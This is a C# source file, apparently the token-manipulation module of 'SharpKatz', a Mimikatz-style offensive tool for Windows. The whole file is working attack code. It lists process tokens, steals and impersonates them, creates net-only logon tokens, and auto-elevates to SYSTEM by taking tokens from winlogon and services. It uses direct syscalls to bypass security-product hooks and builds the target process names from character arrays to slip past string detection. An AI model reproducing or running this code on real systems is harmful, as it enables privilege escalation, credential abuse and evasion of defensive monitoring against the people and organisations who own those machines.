using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using SharpKatz.Win32;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    /// <summary>
    /// Token manipulation module: enumerate, steal (impersonate), make, and revert tokens.
    /// Covers token::list, token::elevate, token::revert, and sekurlsa::pth network-logon variant.
    /// All process access uses direct syscalls to bypass userland hooks.
    /// </summary>
    internal static class Token
    {
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint MAXIMUM_ALLOWED = 0x02000000;

        private const int TokenImpersonation = 2;

        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int LOGON32_PROVIDER_WINNT50 = 3;

        public struct TokenInfo
        {
            public int ProcessId;
            public string ProcessName;
            public string Username;
            public string Domain;
            public string Sid;
            public bool IsElevated;
        }

        /// <summary>
        /// Enumerate unique tokens from all accessible processes using direct syscalls.
        /// Uses ZwQuerySystemInformation + ZwOpenProcess instead of managed Process API.
        /// </summary>
        public static List<TokenInfo> ListTokens()
        {
            var tokens = new List<TokenInfo>();
            var seen = new HashSet<string>();

            // Enumerate processes via syscall
            var processList = EnumerateProcessesSyscall();

            foreach (var entry in processList)
            {
                try
                {
                    // Open process handle via syscall
                    IntPtr hProcess = OpenProcessSyscall(entry.Key, ProcessAccessFlags.QueryInformation);
                    if (hProcess == IntPtr.Zero) continue;

                    try
                    {
                        IntPtr hToken = IntPtr.Zero;
                        if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
                            continue;

                        try
                        {
                            TokenInfo info = GetTokenInfo(hToken, entry.Key, entry.Value);
                            if (string.IsNullOrEmpty(info.Username)) continue;

                            string key = info.Domain + "\\" + info.Username;
                            if (!seen.Contains(key))
                            {
                                seen.Add(key);
                                tokens.Add(info);
                            }
                        }
                        finally
                        {
                            SysCall.ZwClose10(hToken);
                        }
                    }
                    finally
                    {
                        SysCall.ZwClose10(hProcess);
                    }
                }
                catch { }
            }
            return tokens;
        }

        /// <summary>
        /// Steal a token from the specified PID and impersonate on the current thread.
        /// Uses direct syscall to open the target process.
        /// </summary>
        public static bool StealToken(int processId)
        {
            try
            {
                // Open target process via syscall
                IntPtr hProcess = OpenProcessSyscall(processId,
                    ProcessAccessFlags.QueryInformation | ProcessAccessFlags.QueryLimitedInformation);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("  Error: Cannot open process PID " + processId);
                    return false;
                }

                string procName = GetProcessNameById(processId);

                IntPtr hToken = IntPtr.Zero;
                if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken))
                {
                    Console.WriteLine("  Error: Cannot open process token for PID " + processId);
                    SysCall.ZwClose10(hProcess);
                    return false;
                }

                SysCall.ZwClose10(hProcess);

                IntPtr hDupToken = IntPtr.Zero;
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);

                if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, ref sa,
                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TokenImpersonation, ref hDupToken))
                {
                    Console.WriteLine("  Error: Cannot duplicate token");
                    SysCall.ZwClose10(hToken);
                    return false;
                }

                if (!ImpersonateLoggedOnUser(hDupToken))
                {
                    Console.WriteLine("  Error: Impersonation failed");
                    SysCall.ZwClose10(hDupToken);
                    SysCall.ZwClose10(hToken);
                    return false;
                }

                TokenInfo info = GetTokenInfo(hDupToken, processId, procName);
                Console.WriteLine("  Token stolen from PID {0} ({1})", processId, procName);
                Console.WriteLine("  Now impersonating: {0}\\{1}", info.Domain, info.Username);

                SysCall.ZwClose10(hDupToken);
                SysCall.ZwClose10(hToken);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("  Error: " + ex.Message);
                return false;
            }
        }

        /// <summary>
        /// Create a network-logon token (runas /netonly).
        /// Remote resources will use the supplied credentials.
        /// </summary>
        public static bool MakeToken(string domain, string username, string password)
        {
            IntPtr hToken = IntPtr.Zero;
            if (!LogonUser(username, domain, password,
                LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, ref hToken))
            {
                Console.WriteLine("  Error: LogonUser failed");
                return false;
            }

            if (!ImpersonateLoggedOnUser(hToken))
            {
                Console.WriteLine("  Error: Impersonation failed");
                SysCall.ZwClose10(hToken);
                return false;
            }

            Console.WriteLine("  Token created for {0}\\{1}", domain, username);
            Console.WriteLine("  Network access will use these credentials");
            SysCall.ZwClose10(hToken);
            return true;
        }

        /// <summary>
        /// Revert to original token.
        /// </summary>
        public static bool Revert()
        {
            if (RevertToSelf())
            {
                Console.WriteLine("  Reverted to original token");
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("  Current identity: {0}", identity.Name);
                }
                return true;
            }
            Console.WriteLine("  Error: RevertToSelf failed");
            return false;
        }

        /// <summary>
        /// Auto-elevate to SYSTEM by stealing from a SYSTEM process.
        /// Uses syscall-based process enumeration to find target.
        /// </summary>
        public static bool ElevateToSystem()
        {
            string[] targets = new string[]
            {
                new string(new char[] { 'w','i','n','l','o','g','o','n' }),
                new string(new char[] { 's','e','r','v','i','c','e','s' }),
            };

            var processList = EnumerateProcessesSyscall();

            foreach (string name in targets)
            {
                foreach (var entry in processList)
                {
                    try
                    {
                        if (entry.Value.Equals(name, StringComparison.OrdinalIgnoreCase))
                        {
                            if (StealToken(entry.Key))
                                return true;
                        }
                    }
                    catch { }
                }
            }

            Console.WriteLine("  Error: Could not find a SYSTEM process to steal from");
            return false;
        }

        /// <summary>
        /// Enumerate all processes using ZwQuerySystemInformation syscall.
        /// Returns Dictionary of PID -> ProcessName.
        /// Bypasses userland hooks on kernel32/ntdll.
        /// </summary>
        private static Dictionary<int, string> EnumerateProcessesSyscall()
        {
            var result = new Dictionary<int, string>();
            uint bufferSize = 1024 * 1024; // Start with 1MB
            IntPtr buffer = IntPtr.Zero;

            try
            {
                // Allocate and query until buffer is large enough
                uint returnLength = 0;
                NTSTATUS status;

                do
                {
                    buffer = Marshal.AllocHGlobal((int)bufferSize);
                    status = SysCall.ZwQuerySystemInformation10(
                        SYSTEM_INFORMATION_CLASS.SystemProcessInformation,
                        buffer, bufferSize, ref returnLength);

                    if (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall)
                    {
                        Marshal.FreeHGlobal(buffer);
                        buffer = IntPtr.Zero;
                        bufferSize = returnLength + 0x10000; // Add extra margin
                    }
                } while (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall);

                if (status != NTSTATUS.Success || buffer == IntPtr.Zero)
                    return result;

                // Walk the linked list of SYSTEM_PROCESSES structures
                IntPtr currentEntry = buffer;
                while (true)
                {
                    SYSTEM_PROCESSES procInfo = (SYSTEM_PROCESSES)Marshal.PtrToStructure(
                        currentEntry, typeof(SYSTEM_PROCESSES));

                    int pid = procInfo.UniqueProcessId.ToInt32();
                    string name = "";

                    if (procInfo.ImageName.Buffer != IntPtr.Zero && procInfo.ImageName.Length > 0)
                    {
                        name = Marshal.PtrToStringUni(procInfo.ImageName.Buffer,
                            procInfo.ImageName.Length / 2);
                        // Strip .exe extension for consistency with Process.ProcessName
                        if (name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                            name = name.Substring(0, name.Length - 4);
                    }

                    if (pid > 0) // Skip System Idle Process (PID 0)
                        result[pid] = name;

                    if (procInfo.NextEntryOffset == 0)
                        break;

                    currentEntry = (IntPtr)(currentEntry.ToInt64() + procInfo.NextEntryOffset);
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
            }

            return result;
        }

        /// <summary>
        /// Open a process handle using ZwOpenProcess syscall.
        /// </summary>
        private static IntPtr OpenProcessSyscall(int pid, ProcessAccessFlags access)
        {
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)pid,
                UniqueThread = IntPtr.Zero
            };

            NTSTATUS status = SysCall.ZwOpenProcess10(ref hProcess, access, oa, ref ci);
            return status == NTSTATUS.Success ? hProcess : IntPtr.Zero;
        }

        /// <summary>
        /// Get process name by PID using syscall enumeration.
        /// </summary>
        private static string GetProcessNameById(int pid)
        {
            var processes = EnumerateProcessesSyscall();
            return processes.ContainsKey(pid) ? processes[pid] : "unknown";
        }

        /// <summary>
        /// Extract user info from a token handle.
        /// </summary>
        private static TokenInfo GetTokenInfo(IntPtr hToken, int pid, string procName)
        {
            TokenInfo info = new TokenInfo { ProcessId = pid, ProcessName = procName };

            // Get TOKEN_USER
            uint tokenInfoLength = 0;
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);

            if (tokenInfoLength == 0) return info;

            IntPtr tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);
            try
            {
                if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
                    return info;

                // TOKEN_USER is { SID_AND_ATTRIBUTES { IntPtr Sid, uint Attributes } }
                IntPtr pSid = Marshal.ReadIntPtr(tokenInfo);

                // LookupAccountSid via dynamic resolution
                int nameLen = 256, domainLen = 256, peUse = 0;
                IntPtr nameBuffer = Marshal.AllocHGlobal(nameLen * 2);
                IntPtr domainBuffer = Marshal.AllocHGlobal(domainLen * 2);
                try
                {
                    if (LookupAccountSidW(IntPtr.Zero, pSid, nameBuffer, ref nameLen,
                        domainBuffer, ref domainLen, ref peUse))
                    {
                        info.Username = Marshal.PtrToStringUni(nameBuffer);
                        info.Domain = Marshal.PtrToStringUni(domainBuffer);
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(nameBuffer);
                    Marshal.FreeHGlobal(domainBuffer);
                }

                // SID string
                IntPtr sidStr = IntPtr.Zero;
                if (ConvertSidToStringSidW(pSid, ref sidStr))
                {
                    info.Sid = Marshal.PtrToStringUni(sidStr);
                    LocalFree(sidStr);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(tokenInfo);
            }

            // Check elevation (TOKEN_INFORMATION_CLASS.TokenElevation = 20)
            uint elevLen = 0;
            GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)20, IntPtr.Zero, 0, out elevLen);
            if (elevLen > 0)
            {
                IntPtr elevInfo = Marshal.AllocHGlobal((int)elevLen);
                try
                {
                    if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)20, elevInfo, elevLen, out elevLen))
                        info.IsElevated = Marshal.ReadInt32(elevInfo) != 0;
                }
                finally
                {
                    Marshal.FreeHGlobal(elevInfo);
                }
            }

            return info;
        }
    }
}
